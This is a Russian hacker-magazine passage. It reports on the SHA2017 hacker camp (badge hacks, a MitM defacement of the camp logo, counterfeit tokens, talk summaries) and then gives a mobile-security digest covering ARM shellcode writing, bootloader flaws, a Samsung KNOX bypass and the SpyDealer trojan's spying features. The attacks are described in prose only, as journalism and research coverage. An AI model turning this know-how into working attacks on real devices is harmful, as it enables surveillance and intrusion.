ШАТЕР ШАТРУ РОЗНЬ
Большинство посети телей кемпа предпочитали приезжать туда и селиться
не в оди ночку, а объединять ся в так называ емые деревни (villages). Чаще все‐
го — по стра нам. На «деревню» можно взять несколько тентов пять на пять
метров, объеди нить их и получить большое внутреннее пространство, чтобы,
к при меру, проводить там свои мероп риятия.
  При выборе кем па важно не только откуда ты, но и чем интересуешь ся.
Нап ример, немецкую деревню Geraﬀel слышно издалека — там всю ночь гро‐
хота ла музыка и творился полный треш. Впрочем, они пре дупреждали: «Мы —
те парни, которые мощ но шумят в центре кем па, так что ник то не сможет
уснуть».





              Карта территории кемпа со следами взлома

И хотя больше всего на кемпе было имен но немцев и немецких деревень
было пре достаточ но, все же ребята из Geraﬀel однознач но самые отбитые.
Каж дый раз, когда я выходил из их шатра (если я еще мог ходить), у меня
в голове крутилась только одна мысль: «Что это только что вообще было?!»
  А однажды, воз вра щаясь от них в свою палатку, я подслушал разговор двух
стюардов. Один жаловался: «Немцы из Geraﬀel опять шумят. Надо их как‐то
успо коить», а другой уже давно махнул на это рукой: «Я ходил. Они меня
не слушают. Они вооб ще думают, что находят ся в Гер мании».
  Впрочем, фин ны не отста вали: они привезли с собой сауну! А что?
Покодил, попарился, ополоснулся в душе — можно и к немцам дви гать!





                       Главное лого кемпа днем


ВЫПИВКА И ЗАКУСКА
Не подалеку, в кластере Маг ратея, расположился «ресторан на краю все лен‐
ной» Milliways (несложно догадаться, что организаторы этой дерев ни —
лютые фанаты Дугласа Адам са). И хоть он и называл ся рес тораном, поужи‐
нать там мог любой желающий совершенно бесплатно. Эти же ребята в один
из вечеров устроили чудесное мероп риятие Whiskyleaks — что там про исхо‐
дило, оче видно из названия. Ну и в любой день можно было прийти и выпить
пива, как же без него.
   Рядом с Milliways организовали дру гое приятное мес течко — Pizza village,
куда по вечерам выстраива лась длинная оче редь любителей халявы и пиццы.
Прямо сей час, ког да я пишу этот текст, организа торы Pizza village написали
в твиттере, что при едут на EMF2018 — следующий крупный кемп в Великоб‐
ритании.
  В другом конце лагеря я обнаружил бельгийское и итальянское «посоль‐
ства» (эти дерев ни так и называются — Embassy). Бельгийцы специализиро‐
вались на железе и пиве (бельгийском, конечно же). Там можно было поучас‐
тво вать в обучающих воркшопах по управлению гне вом паяльником или прос‐
то отдохнуть, попивая хорошее пиво.





                       Моя палат ка

Итальянцы организо вывали собственные доклады, надо сказать доволь но
интерес ные, и предлагали гостям граппу. В пер вые дни кемпа граппу
еще наливали за донат, но к концу, ког да ста ло ясно, что, если ничего
не изме нить, ее придется везти назад, в воздухе явс твенно запах ло халявой.
Когда подошла моя оче редь, мне сначала накапали дефолтные пятьдесят
граммов, но после того, как я ска зал, что из России, доза мгновенно увеличи‐
лась раз в пять.


БЕЗУМНЫЕ ГИГАБИТЫ
На всей тер ритории лагеря, а это около 16 га, была развернута телефонная
сеть по стандарту DECT. Так что, прихватив из офи са DECT‐телефон, можно
было получить четырех знач ный номер и, зарегистрировав телефон по при‐
бытии на место, наслаждать ся телефонной связью.
  Кроме того что быстро соз ванивать ся с дру гими учас тни ками кемпа,
с помощью этой телефонной сети можно было звонить на номера по всему
миру (кто‐то умудрился поз вонить даже в Ватикан и Северную Корею). Вхо‐
дящие вызовы из внеш него мира по умолчанию были недос тупны. Но если
в этом была необ ходимость, то мож но было поп росить себе прямой нидер‐
ланд ский номер.
  А еще на тер ритории лагеря были расставлены провод ные телефонные
аппараты, под клю чен ные к той же сети. Только вот номеро набирателя на них
не было. Что бы кому‐то поз вонить, нужно снять трубку, покрутить рукоятку,
пос ле чего отвечает оператор, которому надо назвать номер абонента. Такой
вот при ятный олдскул. (Пользуясь случаем, передаю привет своей бабушке,
которая в шестидесятые работа ла телефо нис ткой.)





              Про вод ной полевой телефонный аппарат

Интернет на территории кемпа был просто про изве дением искусства, такой
скорос ти мне видеть еще не приходи лось. Почти все свит чи и роутеры на тер‐
ритории лагеря были десятигига битными. То есть, имея соответс тву ющую
сетевую кар точку, я мог бы скачать фильм раз мером два гигабай та при мерно
за полторы секунды — лишь бы наш лось отку да качать. Но скорость впечат‐
ляла даже со стандар тной гигабитной сетеву хой и уче том того, что 10 Гбит
при ходи лось делить с другими поль зователями.





                Ги габитный интернет в палатке? Легко!

Организаторам кемпа удалось проложить опто волоконный кабель 100GE
длиной 50 км до дата‐цен тра в Амстердаме, откуда уже было четыре апстри‐
ма во внешний мир: два 10GE и два 100GE. Кроме основного стогига битного
канала, был резервный на 10 Гбит.
  И еще один приятный сюрприз: каждый посетитель кемпа на каждом
устройстве получал внешний IPv4‐адрес. Специаль но для этого RIPE предос‐
тавил целую подсеть /16 (и никаких NAT!). Конечно, IPv6 тоже имелся.


ТУАЛЕТ КАК СРЕДСТВО ПЕРЕДАЧИ ДАННЫХ
Не меньше самой технической мощи поражает то, как именно ее доставляли
до посетителей кем па. При помощи сортиров! Так называемая datenklo —
это пластиковая туалетная будка с уста новленным внутри сетевым оборудо‐
вани ем. Однако по прямому назначению исполь зовать кабинку нельзя:
помимо инструк ции по под ключению, в каждой из datenklo висели объ явле ния
со слезной просьбой сетевых администраторов не гадить внутри. Потому что
были пре цеденты, когда подвыпившие хакеры ломали замок и наваливали
кучу прямо на свитч.





                           «Свободно»


ПИРАТСКОЕ РАДИО
Все вре мя проведения мероприятия на частоте 107,1 FM можно было пой‐
мать настоящую пиратскую ради останцию BinaryVoice. При чем передатчик
с антенной, уста новленной на радиовышке, был такой мощности, что сиг нал
можно было ловить не только на всей территории кемпа, но и в семи
километрах от него, в близлежащем городишке Нейкерк.





                Настоящая пиратская ради останция



                                     Продолжение статьи →
СЦЕНА               ← НАЧАЛО СТАТЬИ

        РЕПОРТАЖ С САМОГО ЯРКОГО
       ХАКЕРСКОГО ИВЕНТА ЭТОГО ЛЕТА





ВЗЛОМ БЕЙДЖЕЙ
Отдельного  упо минания  заслуживают  официаль ные  бейджи  ивента.
Как обычно выглядят бейджи на мероп риятиях и конференциях? Кусок
залами нированного кар тона на шнурке. Как выглядели бей джи на SHA2017?
Пол ноценное электронное устрой ство с E  Ink дис пле ем разрешением
296✕128 пикселей, шестью яркими RGB‐све тоди ода ми и модулем Wi‐Fi.
   Что каса ется софтвер ной стороны устройства, то, кроме прошивки, бей‐
джи комплек товались собственным репозитори ем Hatchery с при ложе ниями,
написанными на MicroPython, — ста вятся они в пару кли ков. Посетители быс‐
тро создали при ложения, показы вающие прог ноз погоды на территории кем‐
па, расписание докладов на основных пло щадках и температу ру сауны в фин‐
ской дерев не.





                        Бейджи SHA2017

Не обошлось и без взломов. Так как добавлять приложе ния в репозиторий
мог кто угодно, то в него и ста ли заг ружать вредоносное ПО (обычно с наз‐
вани ями вро де ASCII Porn — ну как тут не кликнуть?). А ата ковав специальную
станцию для перепрошив ки бей джей, умельцы заменили родную про шивку
собствен ной, которая выводила на экран надпись STILL PWNED ANYWAY
и прев ращала устрой ство в кирпич.


ВЗЛОМ ВСЕГО ОСТАЛЬНОГО
Еще до начала ивен та, по тек сту на официальном сай те, становилось понят‐
но, что в поддавки никто играть не будет, и в рекомен даци ях «что лучше оста‐
вить дома» зна чились смартфоны (впрочем, эту рекомендацию все успешно
про игнориро вали), а на ноутбуках советовали оста вить только те данные,
которыми ты готов поделить ся с Wikileaks.
  Ло мали на кемпе всё, до чего могли дотянуть ся. Так, на одном из финаль‐
ных док ладов члены команды NOC (Network Operations Center) сообщили, что
они уже получили около 380 жалоб на абуз и что ожи дают в ближай шие дни
получить еще боль ше таких имейлов. Правда, большинство этих писем были
авто мати ческими и, скорее всего, вызваны круп номасштабными сканиро‐
вани ями пор тов. Ведь трудно устоять, ког да с помощью zmap на гигабитном
канале можно просканировать весь публичный диапазон IPv4 за сорок пять
минут (для одно го выбранного порта).
   Страдали не только внешние ресурсы, но и внутренние. Хакеры из италь‐
янской дерев ни успешно провели MitM‐ата ку на канал переда чи данных,
отре версили  протокол  и  в  итоге  перекрасили  светодиодный  логотип
SHA2017 в центре кемпа в цвета итальянского фла га — такой вот дефейс.
   Ту же ата ку итальянцы про вели и на световую инди кацию, установленную
на каждом datenklo. За эти милые шалос ти команда NOC на заключительном
докладе передавала им горячий привет. И пока итальянцы раз влекались
с инфраструк турой кем па, в бельгийском тенте ломали Тес лы (речь об авто‐
мобилях).
  Впрочем, некоторые техники взлома применять все же не рекомен‐
довалось. К при меру, не стоит выдавать себя за одну из существующих точек
доступа. По сви детельству очевидца, у сисадминов было оборудование
для три ангуляции  Wi‐Fi, поэто му они быстренько находи ли про казников
и боль но били им кримпером по пальцам.





  Позже эту надпись взло мают италь янцы и выведут на нее цвета своего
  флага


ХАКЕРСКИЕ СОСТЯЗАНИЯ
Развлечений было предостаточно не только в сети, но и в реале. В один
из дней устроили гонки на самодельных картонных лодках. Каждая команда
должна была при помощи картона и скотча сделать лодку и преодолеть дис‐
танцию в двадцать пять мет ров. Удавалось это далеко не всем, и неуди‐
вительно — с кар тонны ми‐то веслами. Зрители аплодировали победителям,
но еще более бур ные овации срывал тот, чье судно переворачивалось
и отправ лялось на дно.





               Кресломобиль. Фото с сайта interlogica.it

И каких только средств перед вижения я не встречал на кем пе! И вальяжно
плывущий по грунтовой дороге трехмес тный кожаный диван, и скорос тное
маневренное мягкое кресло, и непонятное нечто, собранное из плас тиковых
ящиков из‐под бутылок. На элек тричес кие лонгборды внимания вообще,
кажется, никто не обращал — там это обычное дело. А вот несущаяся со ско‐
ростью 20 км/ч по ноч ному лагерю палатка произвела настоящий фурор.
Разуме ется, почти всем этим транспортом можно было управлять удаленно.
А вот гирос кутеров там не было. Толь ко диваны, только хар дкор!





      Эта палатка с человеком внутри раз вивала скорость до 20 км/ч

Нельзя не вспом нить и про такую развлекуху, как pixelﬂood bar. Это све тоди‐
одный дисплей размером 3,2 на 2,4 м, стоявший в главном баре кем па. Его
раз решение сос тавляло 320 на 240 точек, но в реальнос ти он состоял из нес‐
кольких фрагментов и был больше похож на голову Микки Мауса с ушами, чем
на прямоуголь ник.
  Лю бой человек мог управлять выводимым на этот экран изображени ем.
Достаточно было отправить Telnet‐пакет со строчкой вида PX 42 42 C0FFEEn,
чтобы окра сить задан ный пик сель в выбранный цвет. Правила простые: один
пакет — один пиксель. При этом с одного адреса допускалось толь ко одно
под клю чение, в которое и нуж но было отправлять дан ные.
   Так как пакеты мог отправ лять кто угодно, то зачас тую изображение
на дисплее отра жало нескончаемую бой ню за мес то на экране.





          Запись аналогичной баталии с дру гого мероприятия.

Ясно, что чем шире канал, тем больше данных можно отпра вить и тем дольше
твое изображение будет держаться на экра не. Судя по все му, некоторые
участни ки не гнушались использовать ботнеты.


3D-ПЕЧАТЬ ПО УМУ
Много чего еще было на SHA2017 — всего не перечислить. А вот чего я почти
не увидел, так это 3D‐принтеров, которые на отечес твенных ивентах все
еще принято выс тавлять напоказ как какую‐то диковинку. Здесь, как и
положено такому оборудованию, они стояли в даль них углах и по‐тихому
что‐то печатали.
  И раз уж речь зашла о 3D‐прин терах, расска жу еще одну байку. Так
как кемп — это неком мерческое мероприятие, то по голландским законам
на нем зап рещено продавать что‐либо за деньги. Но можно было при нимать
пожер тво вания, а в качес тве символов за это выдавались цветные плас‐
тиковые монетки, которые потом в баре мож но было обменять на раз ные
пенистые или горючие жидкости.
   Хакер из деревни NeighbourhoodNerds вос пользовался этим и взло мал
систему, напечатав на 3D‐принтере свои коины, ана логич ные ори гинальным.
Пос ле успешно про веден ной ата ки, получен ного PoC и выпито го пива он
сообщил об уязвимости организаторам (ни один бармен в ходе атаки не пос‐
традал).




                  •Офи циальный сайт кем па
                    •Ви деозаписи  большинства  выступлений   (и
                         на YouTube)
                  •Офи циальный твиттер кемпа (еще больше —
                        по хеш тегу #sha2017)
                         •Electromagnetic Field (EMF) (в данный момент
                          сайт  не  обновлен  и  выда ет  информацию
                        по EMF2016)
                     •Все мероприятия Chaos Computer Club (в том
                         числе  CCCamp  и  Chaos   Communication
                          Congress)
                     •Предпродажа билетов на 34C3



КУДА ЕХАТЬ В СЛЕДУЮЩИЙ РАЗ
Могу представить, как ты, прочитав все это, осоз нал, что сле дующий кемп
только через четыре года, и у тебя слезы на глаза навернулись. Но не
переживай. Уже в августе будущего года в Великоб ритании сос тоится EM‐
F2018, а через два года в Гер мании пройдет очередной CCCamp 2019. Гол‐
ланд ские кем пы и CCCamp про водятся раз в четыре года, но со сдви гом
в два года — как зимняя и летняя Олимпиада. А EMF проходит каждые два
года, но по четным годам. И получа ется, что каждый год бывает один из этих
кемпов и они никогда не пересекаются.
   Ну и помимо кемпов, всег да остается знаменитый DEF CON или не менее
зна мени тый, но значительно более удоб ный географичес ки Chaos Communi‐
cation Congress. Он в оче редной раз пройдет в кон це декабря этого года
в Гер мании. Предпродажа билетов на него уже откры та.




На SHA2017 ездят не за док ладами, но раз уж они там были, то почему бы
не пос лушать? Вот подборка из докладов, которые привлекли мое внимание
(все го их несколь ко десятков).





Этот ввод ный воркшоп по сетям Kirils Solovjovs проводит уже не в первый раз,
и каж дый раз собирается полный зал. В док ладе речь шла об упоминающей ся
в каж дой вто рой статье ][ модели OSI и основных сетевых про токолах: как они
друг с другом соот носятся, из чего сос тоят и как исполь зуют ся. Матерым
сисадминам, которые на память знают битовые флаги про токола TCP, этот
вор кшоп бесполезен, но остальные люди, интересующиеся сетями, навер‐
няка смогут почерпнуть из него немало ценной информации и запол нить про‐
белы в сво ем понимании сетевого стека.





В этом обзорном док ладе финский исследова тель безопасности Юха Нурми
рас сказывает об основных методах деано нимизации в сети  Tor. Среди
них — болтливость пользователей, ата ки на конечного поль зователя (к при‐
меру, 0day JS‐спло иты), атаки по времени и атаки на сер веры, в частнос ти
вызванные ошибками в их кон фигурации (спойлер: основные причины деано‐
ними зации связаны имен но с ошибками пользовате лей).





Забав ный док лад, который прочитал Мэтью Скроггс — младший научный сот‐
рудник из Университетского колледжа Лондона. Должно быть, у него в уни‐
верситете очень мно го сво бодного вре мени, потому что рас сказывал он,
как применить теорию графов для наис корей шего про хождения уровня в игре
Pac‐Man. А пос ле доказал, что игра Asteroids на самом деле происходит
в четырех изме рениях, — без шуток.





В этом док ладе Тал Маламед рассказал об уязвимостях Bluetooth‐устрой ств
с низким энер гопот реблением (BLE), которые пов семес тно используются
в IoT и мобильных устрой ствах. Эксплуатируя эти уязвимости, можно мол ча
перехватывать трафик или даже делать в него инъекции. Прямо на сцене Тал
про вел MitM‐атаку, внедрив в трафик, иду щий от фитнес‐браслета, фейковые
данные, так что при ложение на телефоне показало доволь но внушитель ный
про бег в восемь тысяч километров. Кста ти, оборудование для проведения
этой ата ки можно заказать пря мо с «Алиэкс пресса» за 2,7 дол лара. Вклю чая
доставку.





В отличие от пре дыду щего, этот док лад уже более специализированный.
В нем Винсент Оссе ваарде рассказыва ет об использующихся на морских
судах устройствах навигации и управления, анализируя уязвимости которых
можно прий ти в ужас. Да что уж говорить, если для коммуникации некоторых
девай сов на судне исполь зуется незащищенная Wi‐Fi‐сеть. Винсент показал,
как легко можно получать информа цию с других судов, подделывать переда‐
ваемую информацию или даже перехватывать управление над ними, подклю‐
чив шись к системе автопилота. А внедрив собственный трафик в радиоэфир
системы AIS (automatic identiﬁcation system), мож но раз местить в озере Мар‐
кермер ави аносец USS Nimitz или с помощью виртуальных буев вывес ти
на экран всех кораб лей в окру ге буквы SHA.





И напос ледок самый интересный доклад SHA2017. На самом деле даже
не важ но, кто его читал. В нем будут члены, много чле нов. Члены большие,
маленькие, 8‐битные, члены, рас тущие на деревь ях. Члены‐политики, чле‐
ны‐диктаторы, картины, на которых нарисо ваны чле ны, и картины, нарисован‐
ные членами. При прос мотре член вам заг рузят даже в уши! Небезо пасно
для работы, да и для психики тоже. И не говори потом, что я тебя не пре дуп‐
реждал!


До встре чи на тусе!
X‐MOBILE





     РАЗРАБОТКА ШЕЛЛ‐КОДOВ ПОД ARM,
          БЕЗОПАСНОСТЬ ЗАГРУЗЧИКОВ
 СМАРТФОНОВ И НОВЫЕ ТЕХНИКИ ЗАЩИТЫ
                    ЯДРА У SAMSUNG





                                                                        Евгений Зобнин
                                                                              Редактор Unixoid и Mobile
                                                                                           zobnin@glc.ru





В этом выпус ке: рас пределен ные мессенджеры, которые
нельзя  заблокировать,  крутое  вве дение  в  написание
шелл‐кодов под ARM и  все объ емлющее исследование
безопасности загрузчиков смартфо нов. А так же: разбор
трояна SpyDealer, способного красть данные из 40 сторон‐
них приложе ний, отчеты раз работчиков Android об уси лении
безопасности платформы и множество матери алов для раз‐
работчиков.


ПРИЛОЖЕНИЯ
Ring
В мире, где слежка за людьми — обычное дело и для компаний, и для
государства, прос то не мог ло не появиться приложение, подоб ное Ring.
В двух словах это децентра лизо ванный защищен ный мес сенджер с поддер‐
жкой голосо вых и видеозвонков.
   «Децентрализо ванный» значит, что Ring не опирается в своей работе
на какой‐то один сер вер, как другие мес сендже ры. Для обнаруже ния дру гих
участни ков сети он использует распре деленную высокопроизводительную
хеш‐таблицу OpenDHT, которая позволя ет свя зать абонентов на манер P2P‐
сетей, когда информация доходит до участников сети не через центральный
сервер, а через цепочку других участни ков. «Защищенный» озна чает, что Ring
использует end‐to‐end шиф рование всех видов коммуникации. Так же как в
сек ретных чатах Telegram или в Signal/WhatsApp, содер жимое переписки дос‐
тупно только участни кам этой переписки.
  Вместе обе технологии работают так: ког да один абонент Ring хочет всту‐
пить в беседу с другим або нентом, сна чала клиент находит адрес этого або‐
нента через рас пре деленную  сеть, затем уста нав ливает с ним прямой
зашифрованный канал связи и передает все дан ные через него.
  Все это гарантиру ет, что участни ков Ring нель зя подслу шать, а сам сервис
нельзя выключить, в нем просто нет единой точки отказа. С дру гой стороны,
такая архи тек тура поз воляет выяснить реальные IP‐адреса собеседников:
связь устанав ливается нап рямую, а зна чит, в логах провайдеров осядет
информация, кто и с кем был на связи.
  Проект полностью открытый. Все исходные коды в свободном доступе.
Никакой рекламы и платных функций.





                                  Ring


Antox
Еще один мессенджер, пос тро енный на идее распре деленной зашиф рован‐
ной сети. Архитек тура поч ти полностью повторя ет Ring: рас пределенная
хеш‐таблица або нентов плюс прямое зашиф рованное соединение между
участни ками беседы.
  Дос тоинства и проблемы те же: не выключить, не вскрыть перепис ку, IP
све тят ся в логах. Однако если Ring — это уже хотя бы на сло вах стабильное
ПО (версия 1.0 Stable выш ла 23 июля), то Tox и пос троенный на его осно ве
клиент Antox — аль фа и на словах, и на деле. Клиент нес табильный, к падени‐
ям и проблемам надо быть готовым.
   Tox — полностью сво бод ное ПО с несколькими реали заци ями кли ента
для раз ных платформ, включая Windows, macOS, Linux, FreeBSD, Android
и iOS.





                                  Antox


Syncthing
А это — попытка соз дать децентра лизо ванный Dropbox. Идея Syncthing в том,
чтобы дать поль зовате лям возможность син хронизировать папки между раз‐
ными устройствами без сервера.
   Как и опи санные выше мессенджеры, Syncthing использует рас пределен‐
ную хеш‐таб лицу для поиска узлов. Каждый узел получает уникальный ID,
с помощью которого к нему можно подклю читься и начать синхронизацию
папок между двумя устройствами (если узел раз решил дос туп, разумеется).
Все данные передаются напрямую от узла к узлу в зашифрованном виде.
   Клиенты доступны для Android, Windows, macOS и Linux. Так что можно
орга низовать синхронизацию практически с любыми своими устройствами
и устрой ствами сво их родственников. Доступ к папкам можно контролиро вать
индивидуально, фот ки, нап ример, расшарить со всеми родственниками,
а пароли и клю чи шиф рования — только со своими устройствами.
   Syncthing — открытое при ложение, которое можно ска чать не только в Play
Store, но и в F‐Droid. Никакой платы, никакой рекламы.





                                 Syncthing


ИНСТРУМЕНТЫ
Эму лятор для запуска кода smali
TinySmaliEmulator — эмулятор для запус ка кода smali (дизас сем бли рованный
код Dalvik, в который компилируются все при ложе ния для Android). Так же
как Simplify, может использоваться для деоб фуска ции зашифрованных строк.


ПОЧИТАТЬ
Ре зультаты анализа кода опе рационной системы Tizen
27 000 errors in the Tizen operating system — отчет о результатах ана лиза опе‐
раци онной сис темы Tizen с помощью статичес кого анализатора PVS‐Studio.
Автор проанализировал 3,3% кода Tizen и нашел в нем 900 серьезных оши‐
бок. Умно жив 900 на 30, он пришел к выводу, что, если про анализировать
весь исходный код с помощью PVS‐Studio, удас тся найти не менее 27 тысяч
оши бок. На русском.
   Вот наиболее интересные фраг менты кода.
 • Ошибка срав нения:


   return m_len < m_len;

 • Забытый унарный оператор (должно быть *focus_unit):


   int *focus_unit = (int *)data;
   if (focus_unit == NULL || focus_unit < 0) {
       ...
   }

 • Неб режное использование функции аллокации памяти в цикле:


   while (1) {
       char *buffer = alloca(size);
       ...
   }

 • Неп равиль ное исполь зование функции memset (в данном слу чае дли на
   типа данных gboolean — четыре байта, а memset оперирует бай тами):


   static gboolean req_id_used[BT_REQUEST_ID_RANGE_MAX];
   ...
   memset(req_id_used, 0x00, BT_REQUEST_ID_RANGE_MAX);

 • Повторное прис ваивание зна чений:


   _focused_ic = context_scim;
   _focused_ic = old_focused;

 • Идентичные действия:


   if (mouse_info.pressed == false) {
       return ECORE_CALLBACK_RENEW;
   }
   return ECORE_CALLBACK_RENEW;

А также: разыме нование null‐ука зателей, про верки условий, которые всегда
воз вращают true/false, некорректное использование printf(), ошибки выделе‐
ния/осво бож дения памяти, использование неини циали зированных перемен‐
ных, переполнения буфера, утечки памяти, бес смысленная проверка возвра‐
щаемого с помощью new объекта на null, запись в read‐only‐память и множес‐
тво других глупых ошибок.


Treble и раз деление Android на две независимые части
Shut the HAL Up — пост разработчиков Android об ини циативе Treble, которая
заключается в разделении Android на две незави симые части: одна обес‐
печивает связь с железом (ядро Linux, драйверы и другие низ коуровневые
ком поненты ОС), а дру гая вклю чает в себя саму операционную сис тему
Android.
  Мы уже писали о Treble как решении проб лемы обновле ний и фраг мента‐
ции Android. Однако раз работчики Android заяв ляют, что Treble так же спо‐
собен решить многие проблемы безопасности. Все дело в том, что в рамках
Treble планируется не толь ко разделить ОС на две час ти, но и реорганизовать
зависящие от платформы ком поненты ОС, каждый из которых теперь будет
работать в жестко изолиро ванной песочнице и под держивать связь с ком‐
понентами ОС через типизи рован ные каналы с про веркой пол номочий (для
этого в Binder вне сены соответс твующие правки).


Но вый обще системный фильтр seccomp в Android O
Seccomp ﬁlter in Android O — еще один пост раз работчиков Android. На этот
раз о новом обще системном филь тре seccomp в Android O.
  Seccomp — это технология ядра Linux, которая позволяет ограничить спи‐
сок дос тупных приложению (и в пер спективе опас ных) системных вызовов.
Нап ример, запретить при ложению использовать сис темный вызов execve, что
часто  делают  эксплоиты,  или  заблокиро вать  системный  вызов  listen,
с помощью которого мож но повесить на сетевой порт бэкдор.
   Тех нология используется в Android уже дос таточно дав но, но применяется
в основном к сис темным компонентам. Теперь разработчики решили внед‐
рить seccomp‐фильтр в zygote, про цесс, который порождает процессы всех
установленных в систему приложений.
  Они про анализирова ли, какие системные вызовы нужны для загрузки ОС
и работы большинства приложе ний, а затем отсекли лишние. В ито ге в чер‐
ный       спи сок       попали      17       сис темных       вызовов
из 271 на ARM64 и 70 из 364 на ARM. В списке оказал ся и системный вызов
для под клю чения swap‐раздела, так что, воз можно, в Android O приложения
для активации свопа не заведут ся.





 С таким сооб щением падает приложе ние, попытавшееся выпол нить
  неразрешен ный системный вызов


Вве дение в раз работку шелл‑кодов под ARM
Introduction  to  writing ARM shellcode — быстрое вве дение в раз работку
шелл‐кода для плат формы ARM. Статья небольшая, но очень наглядная.
Автор рассказывает, как выполнять системные вызовы Linux, как выяснить,
какие системные вызовы нужны для тех или иных опе раций, как избавить
шелл‐код от null‐байтов и преобра зовать его в строку.
  Ре комен дуем также прочитать введение в раз работ ку на язы ке ассембле‐
ра для ARM от тех же авторов. Очень прос той в понимании и наглядный гайд.


Большое иссле дование безопасности загрузчиков смартфо нов
BootStomp: On the Security of Bootloaders in Mobile Devices — большое иссле‐
дование безопасности заг рузчиков смар тфонов, в ходе которого было най‐
дено пять ранее неиз вес тных уязвимос тей. Документ содержит массу инте‐
ресной информации, о которой стоит знать любому, кто так или иначе связан
с IT Security:
 • принципы работы Trusted Execution Environment (TEE) в современных смар‐
  тфонах;
 • понятие ARM Exception Levels, опре деляющее контекст исполнения кода
   (от наиме нее привилегированного EL1 до EL3, в котором работают
   началь ный заг рузчик и операционная система TEE);
 • от личия современных загрузчиков смартфо нов от традиционных загрузчи‐
   ков ПК;
 • принципы реали зации Trusted Boot в загрузчи ках и Android;
 • реализация механизма раз блокирования заг рузчика;
 • срав нение загрузчиков Qualcomm, HiSilicon (Huawei), MediaTek и NVIDIA
   (заг рузчи ки HiSilicon и MediaTek очень толсты, работают с максимальными
   привиле гиями и включают в себя массу кода, который обычно располага‐
   ется в загрузчиках, прошитых в ROM).





     Ре ализация Trusted Boot сог ласно спецификациям ARM и Google

SpyDealer: Android Trojan Spying on More Than 40 Apps — результаты иссле‐
дования тро яна SpyDealer, который спо собен красть дан ные 40 раз личных
при ложе ний (вклю чая Facebook, WhatsApp, Skype, Line, Viber, Telegram и Fire‐
fox). Пройдемся по наиболее интересным момен там.
 • Для получения дан ных приложения троян исполь зует сразу несколь ко тех‐
   ник, в том числе root‐дос туп (с помощью инс трумента Baidu Easy Root)
   и Android Accessibility Service.
 • Тро ян уме ет скрытно отвечать на звон ки с задан ного номера, позволяя
   таким образом под слушивать разговоры, просто поз вонив на телефон
  жертвы.
 • Умеет записывать звонки, делать снимки и видеозаписи фронтальной
   и зад ней камерами, отслеживать перемещения устройства, сни мать
   скриншоты.
 • Копирует себя в системный каталог, что бы избе жать удаления.
 • Получа ет команды от удаленного сер вера сразу тре мя спо собами: слу шая
   команды на пор тах TCP и UDP, самостоятельно подключаясь к удаленному
   серверу или через SMS.
 • Тро ян реали зует свой собствен ный про токол поверх UDP, который раз‐
   бивает данные на небольшие блоки и отправляет каждый из них по три
   раза. Сервер собирает их воедино, следуя специальным заголовкам
   в начале каждого блока.
 • Для сбора данных из сто ронних при ложений SpyDealer использует натив‐
   ное при ложение DealApp, работающее с правами root. Оно напрямую
   читает файл базы дан ных при ложения.
 • Для извле чения данных из приложений, использующих шиф рование, троян
   полагается на  Accessibility  Service, с помощью которого незаметно
   копирует строки прямо из откры того окна при ложе ния.
 • Эффективно работает только на Android версий 2.2–4.4. На более поздних
   версиях может унести массу информа ции, но не может получить права
    root, дающие доступ к данным сто ронних приложений.


Но вые техники защиты ядра в смартфо нах Samsung: KASLR, RKP
и DFI
Defeating Samsung KNOX with zero privilege — рассказ о новых техниках
защиты ядра в смартфо нах Samsung (KASLR, RKP — Real‐time kernel protec‐
tion и DFI — Data Flow Integrity) и методах их обхо да для получения прав root
на устройстве.





 Шаги, необходимые для эска лации при вилегий в стандартном Android
  и Samsung


РАЗРАБОТКА ДЛЯ ANDROID
Как авто матически раз делить приложе ние на несколько раз ных
APK для раз ных про цессорных архитек тур
Decreasing Android app size using split APKs — статья о том, как автоматичес ки
раз делить приложение на нес колько разных APK для разных версий Android
и про цессорных архитек тур, чтобы снизить раз мер APK.
  Все действия выполняются с помощью скрипта gradle и директивы splits,
позволя ющей делить на основе имен каталогов с исходным кодом и другой
информации.  Также  статья  поясняет  несколько  не  совсем  оче вид ных
вещей — таких, нап ример, как необ ходимость увеличивать версию каж дого
загружаемого в Play Store APK, несмотря на то что это одна и та же версия
при ложе ния, собранная для раз ных архитек тур.


Простые спо собы сок ратить раз мер сво его ито гово го APK-при-
ложе ния
How to reduce APK size in android — описание способов сократить размер
APK‐приложения. В целом советы очень простые:
 • возьми на вооружение ProGuard, он безжалостно избавляется от неис‐
   пользуемо го кода и сокращает имена классов, методов и полей;
 • настрой раз деление APK для разных вер сий Android (как в предыдущей
   статье);
 • прогоняй приложение через ReDex;
 • ис поль зуй ути литу lint, чтобы избавиться от ненужных ресур сов;
 • ис поль зуй gradle‐дирек тиву shrinkResources для уда ления неиспользуемых
   ресурсов;
 • перехо ди на век торные икон ки;
 • удали любые библиотеки для отладки из финаль ного приложения;
 • замени изображения в форматах PNG и JPG на WebP;
 • ис поль зуй оптимизатор TinyPNG или OptiPNG для сокращения размера
  PNG.


Сравнение про изво дительности приложе ния при использовании
схо жих язы ковых конструк ций в Kotlin и Java
Kotlin’s hidden costs — Benchmarks — статья про веря ет выводы, сделанные
авто ром серии статей Kotlin’s hidden costs, которые мы подробно разбирали
в прошлом выпуске. Результат:
 1. Лям бды Kotlin быстрее своего аналога в Java 8 на 30% (незави симо
   от использования клю чево го сло ва inline).
 2. Объекты‐ком паньоны (companion object) не создают никакого оверхеда,
   а доступ к ним про исхо дит даже быстрее, чем к статическим полям
   и методам в Java.
 3. Вло женные функции не соз дают оверхеда, они даже немного быс трее
   обыч ных.
 4. Повсеместные проверки на null не соз дают оверхеда, код получается
   более быстрым, чем код на Java.
 5. Передача массива как аргу мента функции, ожидающей неопределенное
   число аргументов (vararg), действитель но замедляет исполне ние кода
   в два раза.
 6. Делегаты работают на 10% мед ленней сво ей наиболее эффективной эму‐
   ляции на языке Java.
 7. Ско рость прохода по диапазону (range) не зависит от того, вынесен он
   в отдельную переменную или нет.
 8. Вы несенный в константу range всего на 3% быс трее аналога в коде.
 9. Конструк ция for (it in 1..10) { ... } в три раза быс трее конс‐
   трукции (1..10).forEach { ... } .


Гайд по сопрограммам, появившимся в Kotlin 1.1
Kotlin coroutines guide — одна из луч ших статей о сопрограммах, появив шихся
в Kotlin 1.1. Сопрограммы представляют собой своего рода лег ковесные
потоки, создание и уничтожение которых не стоит ничего. Статья рассказыва‐
ет, как при помощи сопрограмм реали зовать пат терн async/await на манер
C#/Python, а также использовать каналы в сти ле Go для обмена данными
между сопрограммами.


Краткий рассказ о фун кциях Kotlin, облегчающих раз работку
Exploring Easter functions  in  Kotlin — краткий рассказ о функциях  Kotlin,
облегчающих разработ ку:
 • let — функция — расширение всех объектов Kotlin, позволяет ограничить
